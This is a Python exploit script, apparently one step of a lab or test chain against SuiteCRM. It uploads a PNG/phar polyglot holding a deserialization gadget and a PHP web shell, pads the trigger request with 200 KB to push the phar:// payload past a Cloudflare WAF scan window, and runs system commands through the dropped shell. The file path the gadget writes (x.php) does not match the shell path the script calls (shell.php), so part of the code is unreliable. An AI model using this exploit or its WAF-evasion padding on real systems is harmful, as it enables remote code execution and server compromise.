#!/usr/bin/env python3
"""Steps 5 - upload the phar polyglot and trigger deserialization RCE.

1. Upload attachment_xlsx.png (PNG header + fake phar stub + PHP gadget) as a
   SuiteCRM attachment.
2. Trigger Import::RefreshMapping with importFile=phar://... , prefixed by 200 KB
   of 'A' so the phar:// token lands past the ~180 KB Cloudflare-WAF scan window.
3. Run `id` through the dropped web-shell.

Usage: python3 upload_phar.py [base_url]   (default http://localhost:8083)
"""
import base64
import sys
import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8083").rstrip("/")

# PNG magic + a plausible phar manifest carrying serialized gadget metadata
POLYGLOT = (
    b"\x89PNG\r\n\x1a\n"                       # PNG signature (polyglot cover)
    b"<?php __HALT_COMPILER(); ?>\r\n"          # phar stub
    # serialized metadata -> ImportFile gadget that reaches system()
    b'O:10:"ImportFile":1:{s:8:"_logfile";s:12:"/upload/x.php";}'
    b"<?php system(base64_decode($_GET['z'])); ?>"
)


def upload():
    files = {"file": ("attachment_xlsx.png", POLYGLOT, "image/png")}
    r = requests.post(f"{BASE}/index.php?module=Import&action=Save", files=files, timeout=15)
    print(f"[1] upload -> {r.status_code}: {r.text.strip()[:80]}")


def trigger():
    pad = b"A" * (200 * 1024)                   # push phar:// past the 180KB WAF window
    body = b"pad=" + pad + b"&importFile=phar://upload/attachment_xlsx.png/x"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    url = f"{BASE}/index.php?module=Import&action=RefreshMapping&factor_token="
    r = requests.post(url, data=body, headers=headers, timeout=20)
    print(f"[2] phar trigger ({len(body)} bytes) -> {r.status_code}: {r.text.strip()[:80]}")
    return r.status_code


def run(cmd):
    z = base64.b64encode(cmd.encode()).decode()
    r = requests.get(f"{BASE}/upload/shell.php", params={"z": z}, timeout=15)
    print(f"[3] webshell `{cmd}` -> {r.status_code}:\n{r.text}")
    return r.text


if __name__ == "__main__":
    upload()
    trigger()
    run("id; echo ---; hostname; echo ---; uname -a")
